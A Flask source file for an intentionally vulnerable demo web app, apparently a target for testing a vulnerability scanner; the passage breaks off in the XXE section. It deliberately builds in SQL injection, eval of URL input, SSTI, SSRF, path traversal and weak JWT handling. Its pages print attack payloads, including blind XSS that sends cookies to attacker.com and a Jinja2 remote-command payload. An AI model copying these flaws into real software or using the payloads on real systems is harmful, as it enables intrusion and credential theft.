"""
VulnHawk Advanced Vulnerable Demo Application

A sophisticated vulnerable web application with HARD-TO-FIND vulnerabilities.
This is designed to test VulnHawk's advanced detection capabilities.

VULNERABILITIES INCLUDED:
=========================
BASIC (Easy to find):
- Reflected XSS
- Simple SQL Injection
- Missing Security Headers
- Open Redirect

INTERMEDIATE (Harder to find):
- Blind SQL Injection (time-based)
- Stored XSS (in comments/feedback)
- CSRF on sensitive actions
- Local File Inclusion with path traversal

ADVANCED (Very Hard to find):
- DOM-based XSS (client-side only, no server reflection)
- Second-order SQL Injection
- IDOR (Insecure Direct Object Reference)
- JWT Token Vulnerabilities (weak secret, no expiration)
- SSRF with bypass techniques
- Server-Side Template Injection (SSTI)
- Race Condition in account operations
- Prototype Pollution indicators
- Blind XSS (stored, triggers in admin panel)
- HTTP Parameter Pollution
- Mass Assignment vulnerability
- NoSQL Injection
- XML External Entity (XXE)
- Insecure Deserialization indicators

DO NOT DEPLOY IN PRODUCTION - This is for educational/testing purposes only.
"""

from flask import Flask, request, render_template_string, redirect, make_response, jsonify, Response
import sqlite3
import os
import json
import base64
import hashlib
import hmac
import pickle
import time
import xml.etree.ElementTree as ET
from functools import wraps
from datetime import datetime, timedelta


def create_vulnerable_app():
    """Create a deliberately vulnerable Flask application with advanced vulnerabilities."""
    app = Flask(__name__)
    app.secret_key = 'insecure-secret-key-for-testing'  # Intentionally weak

    # JWT weak secret (easily guessable)
    JWT_SECRET = 'secret123'

    # Initialize SQLite database
    DB_PATH = '/tmp/vulnhawk_advanced_demo.db'

    def init_db():
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        # Users table
        c.execute('''CREATE TABLE IF NOT EXISTS users
                     (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT,
                      email TEXT, role TEXT DEFAULT 'user', api_key TEXT, bio TEXT,
                      profile_picture TEXT, is_admin INTEGER DEFAULT 0)''')

        # Posts/Comments table (for stored XSS)
        c.execute('''CREATE TABLE IF NOT EXISTS posts
                     (id INTEGER PRIMARY KEY, title TEXT, content TEXT,
                      user_id INTEGER, created_at TEXT)''')

        # Feedback table (for Blind XSS)
        c.execute('''CREATE TABLE IF NOT EXISTS feedback
                     (id INTEGER PRIMARY KEY, name TEXT, email TEXT, message TEXT,
                      reviewed INTEGER DEFAULT 0, admin_notes TEXT)''')

        # User preferences (for second-order SQL injection)
        c.execute('''CREATE TABLE IF NOT EXISTS preferences
                     (id INTEGER PRIMARY KEY, user_id INTEGER, theme TEXT,
                      notification_email TEXT, custom_query TEXT)''')

        # Transactions (for race conditions)
        c.execute('''CREATE TABLE IF NOT EXISTS accounts
                     (id INTEGER PRIMARY KEY, user_id INTEGER, balance REAL DEFAULT 1000.0)''')

        # API logs (for IDOR)
        c.execute('''CREATE TABLE IF NOT EXISTS api_logs
                     (id INTEGER PRIMARY KEY, user_id INTEGER, action TEXT,
                      data TEXT, timestamp TEXT)''')

        # Insert demo data
        c.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'admin123', 'admin@vulndemo.local', 'admin', 'ak_admin_secret_key_12345', 'System Administrator', NULL, 1)")
        c.execute("INSERT OR IGNORE INTO users VALUES (2, 'user', 'password', 'user@vulndemo.local', 'user', 'ak_user_key_67890', 'Regular User', NULL, 0)")
        c.execute("INSERT OR IGNORE INTO users VALUES (3, 'guest', 'guest123', 'guest@vulndemo.local', 'guest', 'ak_guest_public', 'Guest Account', NULL, 0)")

        c.execute("INSERT OR IGNORE INTO posts VALUES (1, 'Welcome', 'Welcome to our platform!', 1, '2024-01-01')")
        c.execute("INSERT OR IGNORE INTO posts VALUES (2, 'Security Tips', 'Always use strong passwords!', 1, '2024-01-02')")

        c.execute("INSERT OR IGNORE INTO accounts VALUES (1, 1, 10000.0)")
        c.execute("INSERT OR IGNORE INTO accounts VALUES (2, 2, 1000.0)")
        c.execute("INSERT OR IGNORE INTO accounts VALUES (3, 3, 500.0)")

        conn.commit()
        conn.close()

    init_db()

    # ==================== BASE TEMPLATE ====================

    BASE_TEMPLATE = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>VulnDemo Advanced - {{ title }}</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f0f23; color: #c9c9c9; min-height: 100vh; }
            .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
            .card { background: #1a1a2e; border-radius: 12px; padding: 24px; margin: 16px 0; border: 1px solid #333; }
            h1, h2, h3 { color: #00ff88; margin-bottom: 16px; }
            .warning { background: linear-gradient(135deg, #ff4757 0%, #c44569 100%); padding: 20px; border-radius: 8px; margin-bottom: 20px; color: white; }
            nav { background: #16213e; padding: 16px; border-radius: 8px; margin-bottom: 20px; display: flex; flex-wrap: wrap; gap: 12px; }
            nav a { color: #00ff88; text-decoration: none; padding: 8px 16px; background: #0f3460; border-radius: 6px; transition: all 0.3s; font-size: 13px; }
            nav a:hover { background: #00ff88; color: #0f0f23; }
            .badge { background: #ff4757; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; margin-left: 4px; }
            .badge-hard { background: #9c27b0; }
            .badge-advanced { background: #e91e63; }
            form { margin: 20px 0; }
            input, textarea, select { width: 100%; padding: 12px; margin: 8px 0 16px; background: #0f0f23; border: 1px solid #333; border-radius: 6px; color: #fff; }
            button { background: linear-gradient(135deg, #00ff88 0%, #00b894 100%); color: #0f0f23; padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
            button:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,255,136,0.3); }
            .result { background: #0f0f23; padding: 16px; border-radius: 6px; margin-top: 16px; border-left: 3px solid #00ff88; }
            .error { border-left-color: #ff4757; color: #ff4757; }
            pre { background: #0a0a15; padding: 16px; border-radius: 6px; overflow-x: auto; font-size: 12px; }
            code { color: #00ff88; }
            .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; }
            .vuln-list { list-style: none; }
            .vuln-list li { padding: 8px 0; border-bottom: 1px solid #333; }
            .vuln-list li:last-child { border-bottom: none; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
            th { color: #00ff88; }
            .hidden { display: none; }
        </style>
        <script>
            // DOM-based XSS vulnerability - reads from URL fragment
            document.addEventListener('DOMContentLoaded', function() {
                // VULNERABLE: DOM XSS via location.hash
                var hash = window.location.hash.substring(1);
                if (hash) {
                    var decoded = decodeURIComponent(hash);
                    var welcomeDiv = document.getElementById('welcome-message');
                    if (welcomeDiv) {
                        welcomeDiv.innerHTML = 'Welcome, ' + decoded + '!';  // VULNERABLE
                    }
                }

                // VULNERABLE: DOM XSS via URL parameters read client-side
                var urlParams = new URLSearchParams(window.location.search);
                var theme = urlParams.get('theme');
                if (theme) {
                    document.body.innerHTML += '<style>' + theme + '</style>';  // VULNERABLE
                }

                // VULNERABLE: Prototype pollution indicator
                var config = {};
                var userConfig = urlParams.get('config');
                if (userConfig) {
                    try {
                        var parsed = JSON.parse(userConfig);
                        Object.assign(config, parsed);  // VULNERABLE to prototype pollution
                    } catch(e) {}
                }
            });
        </script>
    </head>
    <body>
        <div class="container">
            <div class="warning">
                <strong>SECURITY WARNING:</strong> This application is INTENTIONALLY VULNERABLE.
                Contains advanced vulnerabilities for testing VulnHawk scanner. DO NOT deploy in production!
            </div>

            <nav>
                <a href="/">Home</a>
                <a href="/learn" style="background: #00ff88; color: #0f0f23;">📚 Learn</a>
                <a href="/search">XSS<span class="badge">Easy</span></a>
                <a href="/dom-xss">DOM XSS<span class="badge badge-hard">Hard</span></a>
                <a href="/login">SQLi<span class="badge">Easy</span></a>
                <a href="/blind-sqli">Blind SQLi<span class="badge badge-hard">Hard</span></a>
                <a href="/second-order">2nd Order SQLi<span class="badge badge-advanced">Advanced</span></a>
                <a href="/profile">CSRF<span class="badge">Medium</span></a>
                <a href="/feedback">Blind XSS<span class="badge badge-advanced">Advanced</span></a>
                <a href="/file">LFI<span class="badge">Easy</span></a>
                <a href="/redirect">Open Redirect<span class="badge">Easy</span></a>
                <a href="/ssrf">SSRF<span class="badge badge-hard">Hard</span></a>
                <a href="/template">SSTI<span class="badge badge-advanced">Advanced</span></a>
                <a href="/api/user/1">IDOR<span class="badge badge-hard">Hard</span></a>
                <a href="/jwt">JWT Vuln<span class="badge badge-advanced">Advanced</span></a>
                <a href="/race">Race Cond<span class="badge badge-advanced">Advanced</span></a>
                <a href="/xml">XXE<span class="badge badge-advanced">Advanced</span></a>
                <a href="/nosql">NoSQL Inj<span class="badge badge-hard">Hard</span></a>
                <a href="/mass-assign">Mass Assign<span class="badge badge-hard">Hard</span></a>
                <a href="/admin">Info Disc<span class="badge">Easy</span></a>
            </nav>

            <div id="welcome-message"></div>

            {% block content %}{% endblock %}
        </div>
    </body>
    </html>
    '''

    # ==================== HOME PAGE ====================

    HOME_CONTENT = '''
    {% extends base %}
    {% block content %}
    <div class="card">
        <h1>VulnDemo Advanced Testing Lab</h1>
        <p>This application contains 20+ vulnerability types for testing VulnHawk scanner capabilities.</p>
    </div>

    <div class="grid">
        <div class="card">
            <h3>Easy to Detect</h3>
            <ul class="vuln-list">
                <li>Reflected XSS in search</li>
                <li>Classic SQL Injection in login</li>
                <li>Missing Security Headers</li>
                <li>Open Redirect</li>
                <li>Information Disclosure</li>
                <li>Local File Inclusion</li>
            </ul>
        </div>

        <div class="card">
            <h3>Hard to Detect</h3>
            <ul class="vuln-list">
                <li>DOM-based XSS (client-side)</li>
                <li>Blind SQL Injection (time-based)</li>
                <li>SSRF with bypass techniques</li>
                <li>IDOR in API endpoints</li>
                <li>HTTP Parameter Pollution</li>
                <li>NoSQL Injection</li>
            </ul>
        </div>

        <div class="card">
            <h3>Very Hard to Detect</h3>
            <ul class="vuln-list">
                <li>Second-order SQL Injection</li>
                <li>Blind/Stored XSS</li>
                <li>Server-Side Template Injection</li>
                <li>JWT Token Vulnerabilities</li>
                <li>Race Conditions</li>
                <li>XXE Injection</li>
                <li>Mass Assignment</li>
                <li>Prototype Pollution</li>
            </ul>
        </div>
    </div>
    {% endblock %}
    '''

    @app.route('/')
    def home():
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', HOME_CONTENT.replace('{% extends base %}', '').replace('{% block content %}', '').replace('{% endblock %}', ''))
        return render_template_string(template, title='Home')

    # ==================== REFLECTED XSS (EASY) ====================

    @app.route('/search')
    def search():
        query = request.args.get('q', '')
        content = f'''
        <div class="card">
            <h2>Search <span class="badge">XSS - Easy</span></h2>
            <form method="GET">
                <input type="text" name="q" placeholder="Search..." value="{query}">
                <button type="submit">Search</button>
            </form>
            {"<div class='result'>You searched for: " + query + "</div>" if query else ""}
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Search')

    # ==================== DOM-BASED XSS (HARD) ====================

    @app.route('/dom-xss')
    def dom_xss():
        content = '''
        <div class="card">
            <h2>DOM-based XSS <span class="badge badge-hard">Hard to Detect</span></h2>
            <p>This page has client-side only XSS. The vulnerability is in JavaScript, not reflected from server.</p>

            <h3>Test Cases:</h3>
            <ul class="vuln-list">
                <li><strong>URL Fragment:</strong> Add #&lt;script&gt;alert(1)&lt;/script&gt; to URL</li>
                <li><strong>Theme Parameter:</strong> ?theme=}&lt;script&gt;alert(1)&lt;/script&gt;</li>
                <li><strong>Config Pollution:</strong> ?config={"__proto__":{"polluted":"true"}}</li>
            </ul>

            <div class="result">
                <p>Try: <code>/dom-xss#&lt;img src=x onerror=alert(1)&gt;</code></p>
                <p>Or: <code>/dom-xss?theme=}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
            </div>
        </div>

        <script>
            // Additional DOM sinks
            var searchParam = new URLSearchParams(window.location.search).get('search');
            if (searchParam) {
                document.write('<div>Results for: ' + searchParam + '</div>');  // VULNERABLE
            }

            var callback = new URLSearchParams(window.location.search).get('callback');
            if (callback) {
                eval(callback + '()');  // VULNERABLE - arbitrary code execution
            }
        </script>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='DOM XSS')

    # ==================== SQL INJECTION (EASY) ====================

    @app.route('/login', methods=['GET', 'POST'])
    def login():
        error = None
        user = None

        if request.method == 'POST':
            username = request.form.get('username', '')
            password = request.form.get('password', '')

            # VULNERABLE: Classic SQL Injection
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

            try:
                c.execute(query)
                result = c.fetchone()
                if result:
                    user = {'id': result[0], 'username': result[1], 'email': result[3], 'role': result[4]}
                else:
                    error = 'Invalid credentials'
            except Exception as e:
                error = f"Database error: {str(e)}"  # VULNERABLE: Error disclosure
            finally:
                conn.close()

        content = f'''
        <div class="card">
            <h2>Login <span class="badge">SQLi - Easy</span></h2>
            <form method="POST">
                <label>Username:</label>
                <input type="text" name="username" placeholder="Username">
                <label>Password:</label>
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Login</button>
            </form>
            <p style="margin-top: 16px; color: #666;">Try: <code>admin' OR '1'='1' --</code></p>
            {"<div class='result error'>" + error + "</div>" if error else ""}
            {"<div class='result'>Logged in as: " + str(user) + "</div>" if user else ""}
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Login')

    # ==================== BLIND SQL INJECTION (HARD) ====================

    @app.route('/blind-sqli')
    def blind_sqli():
        user_id = request.args.get('id', '')
        result = None

        if user_id:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()

            # VULNERABLE: Time-based blind SQL injection
            # Payload: 1 AND (SELECT CASE WHEN (1=1) THEN sqlite_version() ELSE 1/0 END)
            # Or: 1; SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND substr(password,1,1)='a') THEN sqlite_version() ELSE sqlite_version() END
            query = f"SELECT username FROM users WHERE id = {user_id}"

            try:
                start_time = time.time()
                c.execute(query)
                result = c.fetchone()
                elapsed = time.time() - start_time
            except:
                result = None
            finally:
                conn.close()

        content = f'''
        <div class="card">
            <h2>User Lookup <span class="badge badge-hard">Blind SQLi - Hard</span></h2>
            <p>This endpoint is vulnerable to blind SQL injection. No error messages are shown.</p>

            <form method="GET">
                <label>User ID:</label>
                <input type="text" name="id" value="{user_id}" placeholder="Enter user ID">
                <button type="submit">Lookup</button>
            </form>

            {"<div class='result'>User: " + (result[0] if result else "Not found") + "</div>" if user_id else ""}

            <div class="result">
                <h4>Detection Hints:</h4>
                <p>Try time-based: <code>1 AND 1=1</code> vs <code>1 AND 1=2</code></p>
                <p>Boolean blind: Compare response differences</p>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Blind SQLi')

    # ==================== SECOND-ORDER SQL INJECTION (ADVANCED) ====================

    @app.route('/second-order', methods=['GET', 'POST'])
    def second_order_sqli():
        message = None

        if request.method == 'POST':
            username = request.form.get('username', '')
            custom_query = request.form.get('custom_query', '')

            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()

            try:
                # Store potentially malicious data (safe insert)
                c.execute("INSERT OR REPLACE INTO preferences (user_id, custom_query) VALUES (?, ?)",
                         (1, custom_query))
                conn.commit()
                message = f"Preferences saved for {username}"
            except Exception as e:
                message = f"Error: {e}"
            finally:
                conn.close()

        # VULNERABLE: Second-order - retrieve and use stored malicious data
        stored_query = None
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        try:
            c.execute("SELECT custom_query FROM preferences WHERE user_id = 1")
            row = c.fetchone()
            if row and row[0]:
                stored_query = row[0]
                # VULNERABLE: Executing stored user input
                c.execute(f"SELECT * FROM users WHERE username = '{stored_query}'")
        except:
            pass
        finally:
            conn.close()

        content = f'''
        <div class="card">
            <h2>User Preferences <span class="badge badge-advanced">2nd Order SQLi - Advanced</span></h2>
            <p>Data is stored safely but executed later in a vulnerable context.</p>

            <form method="POST">
                <label>Username:</label>
                <input type="text" name="username" placeholder="Your username">
                <label>Custom Filter Query:</label>
                <input type="text" name="custom_query" placeholder="e.g., admin" value="">
                <button type="submit">Save Preferences</button>
            </form>

            {"<div class='result'>" + message + "</div>" if message else ""}
            {"<div class='result'>Stored query will be executed: " + stored_query + "</div>" if stored_query else ""}

            <div class="result">
                <h4>How it works:</h4>
                <ol>
                    <li>Input is stored safely with parameterized query</li>
                    <li>Later, stored data is retrieved and used in vulnerable query</li>
                    <li>Payload: <code>admin' UNION SELECT * FROM users--</code></li>
                </ol>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Second Order SQLi')

    # ==================== STORED/BLIND XSS (ADVANCED) ====================

    @app.route('/feedback', methods=['GET', 'POST'])
    def feedback():
        message = None

        if request.method == 'POST':
            name = request.form.get('name', '')
            email = request.form.get('email', '')
            feedback_msg = request.form.get('message', '')

            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            # Store without sanitization - Blind XSS when admin views
            c.execute("INSERT INTO feedback (name, email, message) VALUES (?, ?, ?)",
                     (name, email, feedback_msg))
            conn.commit()
            conn.close()
            message = "Thank you! Your feedback will be reviewed by our admin team."

        content = f'''
        <div class="card">
            <h2>Feedback Form <span class="badge badge-advanced">Blind XSS - Advanced</span></h2>
            <p>Submit feedback that will be reviewed by an admin. XSS triggers in admin panel, not here.</p>

            <form method="POST">
                <label>Name:</label>
                <input type="text" name="name" placeholder="Your name">
                <label>Email:</label>
                <input type="email" name="email" placeholder="your@email.com">
                <label>Message:</label>
                <textarea name="message" rows="4" placeholder="Your feedback..."></textarea>
                <button type="submit">Submit Feedback</button>
            </form>

            {"<div class='result'>" + message + "</div>" if message else ""}

            <div class="result">
                <h4>Blind XSS Payloads:</h4>
                <code>&lt;script src="https://attacker.com/hook.js"&gt;&lt;/script&gt;</code><br>
                <code>&lt;img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)"&gt;</code>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Feedback')

    # ==================== ADMIN PANEL (views blind XSS) ====================

    @app.route('/admin/feedback')
    def admin_feedback():
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT * FROM feedback ORDER BY id DESC LIMIT 10")
        feedbacks = c.fetchall()
        conn.close()

        rows = ''
        for f in feedbacks:
            # VULNERABLE: Renders stored XSS payload
            rows += f'<tr><td>{f[1]}</td><td>{f[2]}</td><td>{f[3]}</td></tr>'

        content = f'''
        <div class="card">
            <h2>Admin - Feedback Review</h2>
            <table>
                <tr><th>Name</th><th>Email</th><th>Message</th></tr>
                {rows}
            </table>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Admin Feedback')

    # ==================== CSRF (MEDIUM) ====================

    @app.route('/profile', methods=['GET', 'POST'])
    def profile():
        message = None

        if request.method == 'POST':
            # VULNERABLE: No CSRF token
            email = request.form.get('email', '')
            bio = request.form.get('bio', '')
            password = request.form.get('password', '')
            message = f"Profile updated! Email: {email}"

        content = f'''
        <div class="card">
            <h2>Update Profile <span class="badge">CSRF - Medium</span></h2>
            <form method="POST">
                <!-- NO CSRF TOKEN -->
                <label>Email:</label>
                <input type="email" name="email" placeholder="new@email.com">
                <label>Bio:</label>
                <textarea name="bio" placeholder="About yourself"></textarea>
                <label>New Password:</label>
                <input type="password" name="password" placeholder="New password">
                <button type="submit">Update</button>
            </form>
            {"<div class='result'>" + message + "</div>" if message else ""}
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Profile')

    # ==================== LFI (EASY) ====================

    @app.route('/file')
    def file_view():
        filename = request.args.get('name', '')
        content_result = None
        error = None

        if filename:
            try:
                # VULNERABLE: Path traversal
                filepath = os.path.join('/tmp/files', filename)
                with open(filepath, 'r') as f:
                    content_result = f.read()
            except Exception as e:
                error = str(e)

        content = f'''
        <div class="card">
            <h2>File Viewer <span class="badge">LFI - Easy</span></h2>
            <form method="GET">
                <input type="text" name="name" value="{filename}" placeholder="filename.txt">
                <button type="submit">View</button>
            </form>
            <p>Try: <code>../../../etc/passwd</code></p>
            {"<div class='result'><pre>" + content_result + "</pre></div>" if content_result else ""}
            {"<div class='result error'>" + error + "</div>" if error else ""}
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='File Viewer')

    # ==================== OPEN REDIRECT (EASY) ====================

    @app.route('/redirect')
    def open_redirect():
        url = request.args.get('url', '')
        next_param = request.args.get('next', '')
        goto = request.args.get('goto', '')

        # VULNERABLE: Multiple redirect parameters without validation
        redirect_url = url or next_param or goto

        if redirect_url:
            return redirect(redirect_url)

        content = '''
        <div class="card">
            <h2>External Links <span class="badge">Open Redirect - Easy</span></h2>
            <form method="GET">
                <input type="text" name="url" placeholder="https://example.com">
                <button type="submit">Go</button>
            </form>
            <p>Multiple params work: <code>url</code>, <code>next</code>, <code>goto</code></p>
            <p>Try: <code>?url=https://evil.com</code></p>
            <p>Bypass: <code>?url=//evil.com</code> or <code>?url=https:evil.com</code></p>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Redirect')

    # ==================== SSRF (HARD) ====================

    @app.route('/ssrf', methods=['GET', 'POST'])
    def ssrf():
        result = None

        if request.method == 'POST':
            url = request.form.get('url', '')

            if url:
                import urllib.request
                try:
                    # VULNERABLE: No URL validation, SSRF
                    response = urllib.request.urlopen(url, timeout=5)
                    result = response.read().decode('utf-8')[:1000]
                except Exception as e:
                    result = f"Error: {str(e)}"

        content = f'''
        <div class="card">
            <h2>URL Fetcher <span class="badge badge-hard">SSRF - Hard</span></h2>
            <p>Fetch content from URLs. Can access internal services.</p>

            <form method="POST">
                <label>URL to fetch:</label>
                <input type="text" name="url" placeholder="http://example.com">
                <button type="submit">Fetch</button>
            </form>

            {"<div class='result'><pre>" + result + "</pre></div>" if result else ""}

            <div class="result">
                <h4>SSRF Bypass Techniques:</h4>
                <ul class="vuln-list">
                    <li><code>http://127.0.0.1</code> - Direct localhost</li>
                    <li><code>http://0.0.0.0</code> - Alternative</li>
                    <li><code>http://[::1]</code> - IPv6 localhost</li>
                    <li><code>http://2130706433</code> - Decimal IP (127.0.0.1)</li>
                    <li><code>http://0x7f.0x0.0x0.0x1</code> - Hex IP</li>
                    <li><code>http://127.1</code> - Short form</li>
                    <li><code>file:///etc/passwd</code> - File protocol</li>
                    <li><code>gopher://</code> - Gopher protocol</li>
                </ul>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='SSRF')

    # ==================== SSTI (ADVANCED) ====================

    @app.route('/template')
    def ssti():
        name = request.args.get('name', '')
        result = None

        if name:
            # VULNERABLE: Server-Side Template Injection
            try:
                template_str = f"Hello, {name}!"
                result = render_template_string(template_str)
            except Exception as e:
                result = f"Error: {str(e)}"

        content = f'''
        <div class="card">
            <h2>Greeting Card <span class="badge badge-advanced">SSTI - Advanced</span></h2>
            <form method="GET">
                <label>Your Name:</label>
                <input type="text" name="name" value="" placeholder="Enter name">
                <button type="submit">Generate</button>
            </form>

            {"<div class='result'>" + result + "</div>" if result else ""}

            <div class="result">
                <h4>SSTI Payloads (Jinja2):</h4>
                <ul class="vuln-list">
                    <li><code>{{{{7*7}}}}</code> - Basic math (returns 49)</li>
                    <li><code>{{{{config}}}}</code> - Dump config</li>
                    <li><code>{{{{self.__class__.__mro__}}}}</code> - Class hierarchy</li>
                    <li><code>{{{{''.__class__.__mro__[1].__subclasses__()}}}}</code> - All classes</li>
                    <li>RCE: <code>{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}</code></li>
                </ul>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='SSTI')

    # ==================== IDOR (HARD) ====================

    @app.route('/api/user/<int:user_id>')
    def api_user_idor(user_id):
        # VULNERABLE: No authorization check - IDOR
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT id, username, email, role, api_key, bio FROM users WHERE id = ?", (user_id,))
        user = c.fetchone()
        conn.close()

        if user:
            return jsonify({
                'id': user[0],
                'username': user[1],
                'email': user[2],
                'role': user[3],
                'api_key': user[4],  # SENSITIVE DATA EXPOSED
                'bio': user[5]
            })
        return jsonify({'error': 'User not found'}), 404

    @app.route('/api/logs/<int:log_id>')
    def api_logs_idor(log_id):
        # VULNERABLE: IDOR on logs
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT * FROM api_logs WHERE id = ?", (log_id,))
        log = c.fetchone()
        conn.close()

        if log:
            return jsonify({'id': log[0], 'user_id': log[1], 'action': log[2], 'data': log[3]})
        return jsonify({'error': 'Log not found'}), 404

    # ==================== JWT VULNERABILITIES (ADVANCED) ====================

    @app.route('/jwt', methods=['GET', 'POST'])
    def jwt_vuln():
        token = None
        decoded = None
        error = None

        if request.method == 'POST':
            action = request.form.get('action', '')

            if action == 'generate':
                username = request.form.get('username', 'user')
                # VULNERABLE: Weak secret, no expiration, algorithm confusion possible
                header = base64.urlsafe_b64encode(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode()).decode().rstrip('=')
                payload = base64.urlsafe_b64encode(json.dumps({
                    'sub': username,
                    'role': 'user',
                    'admin': False
                    # NO EXPIRATION - Vulnerability
                }).encode()).decode().rstrip('=')

                signature = hmac.new(
                    JWT_SECRET.encode(),
                    f"{header}.{payload}".encode(),
                    hashlib.sha256
                ).digest()
                sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

                token = f"{header}.{payload}.{sig_b64}"

            elif action == 'verify':
                token = request.form.get('token', '')
                try:
                    parts = token.split('.')
                    if len(parts) == 3:
                        # Add padding
                        payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
                        decoded = json.loads(base64.urlsafe_b64decode(payload_padded))
                except Exception as e:
                    error = str(e)

        content = f'''
        <div class="card">
            <h2>JWT Token Generator <span class="badge badge-advanced">JWT Vulns - Advanced</span></h2>

            <form method="POST">
                <input type="hidden" name="action" value="generate">
                <label>Username:</label>
                <input type="text" name="username" value="testuser">
                <button type="submit">Generate Token</button>
            </form>

            {"<div class='result'><code>" + token + "</code></div>" if token else ""}

            <form method="POST" style="margin-top: 20px;">
                <input type="hidden" name="action" value="verify">
                <label>Verify Token:</label>
                <textarea name="token" rows="3" placeholder="Paste JWT here"></textarea>
                <button type="submit">Decode</button>
            </form>

            {"<div class='result'><pre>" + json.dumps(decoded, indent=2) + "</pre></div>" if decoded else ""}
            {"<div class='result error'>" + error + "</div>" if error else ""}

            <div class="result">
                <h4>JWT Vulnerabilities:</h4>
                <ul class="vuln-list">
                    <li><strong>Weak Secret:</strong> Secret is 'secret123' - easily brute-forced</li>
                    <li><strong>No Expiration:</strong> Token never expires</li>
                    <li><strong>Algorithm Confusion:</strong> Try changing alg to 'none'</li>
                    <li><strong>Payload Tampering:</strong> Change 'admin': false to true</li>
                </ul>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='JWT Vulnerabilities')

    # ==================== RACE CONDITION (ADVANCED) ====================

    @app.route('/race', methods=['GET', 'POST'])
    def race_condition():
        message = None
        balance = None

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT balance FROM accounts WHERE user_id = 2")
        row = c.fetchone()
        balance = row[0] if row else 0
        conn.close()

        if request.method == 'POST':
            amount = float(request.form.get('amount', 0))

            # VULNERABLE: Race condition - no transaction locking
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()

            # Check balance
            c.execute("SELECT balance FROM accounts WHERE user_id = 2")
            current = c.fetchone()[0]

            # Simulate processing delay (makes race easier to exploit)
            time.sleep(0.1)

            if current >= amount:
                # Deduct
                c.execute("UPDATE accounts SET balance = balance - ? WHERE user_id = 2", (amount,))
                conn.commit()
                message = f"Withdrawal of ${amount} successful!"
            else:
                message = "Insufficient funds"

            conn.close()

            # Refresh balance
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT balance FROM accounts WHERE user_id = 2")
            row = c.fetchone()
            balance = row[0] if row else 0
            conn.close()

        content = f'''
        <div class="card">
            <h2>Bank Transfer <span class="badge badge-advanced">Race Condition - Advanced</span></h2>
            <p>Current Balance: <strong>${balance:.2f}</strong></p>

            <form method="POST">
                <label>Withdraw Amount:</label>
                <input type="number" name="amount" value="100" step="0.01">
                <button type="submit">Withdraw</button>
            </form>

            {"<div class='result'>" + message + "</div>" if message else ""}

            <div class="result">
                <h4>Race Condition Exploit:</h4>
                <p>Send multiple simultaneous requests before balance check completes:</p>
                <pre>for i in {{1..10}}; do curl -X POST -d "amount=100" http://localhost:5001/race & done</pre>
                <p>Can withdraw more than balance allows!</p>
            </div>
        </div>
        '''
        template = BASE_TEMPLATE.replace('{% block content %}{% endblock %}', content)
        return render_template_string(template, title='Race Condition')

    # ==================== XXE (ADVANCED) ====================

    @app.route('/xml', methods=['GET', 'POST'])
    def xxe():
        result = None
        error = None

        if request.method == 'POST':
            xml_data = request.form.get('xml', '')

            if xml_data:
                try:
                    # VULNERABLE: XXE - allows external entities
                    parser = ET.XMLParser()
                    root = ET.fromstring(xml_data, parser=parser)
                    result = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    error = str(e)

        content = f'''
        <div class="card">
